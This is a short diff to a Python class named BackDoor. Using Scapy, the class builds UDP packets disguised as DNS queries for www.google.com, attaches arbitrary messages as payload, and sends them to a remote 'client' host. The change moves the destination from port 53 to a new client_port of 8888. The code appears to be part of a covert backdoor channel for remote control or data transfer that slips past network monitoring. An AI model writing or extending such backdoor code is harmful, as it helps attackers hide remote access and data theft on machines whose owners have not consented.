@@ -17,6 +17,7 @@ class BackDoor:
         self.flag_begin = "****["
         self.flag_close = "]****"
         self.port = 53
+        self.client_port = 8888
         self.client = ""
 
     def start(self):
@@ -24,7 +25,7 @@ class BackDoor:
         self.sniff_init()
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
-        udp = UDP(sport=RandShort(), dport=53)
+        udp = UDP(sport=RandShort(), dport=self.client_port)
         dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
         payload = msg
         pkt = ip / udp / dns / payload
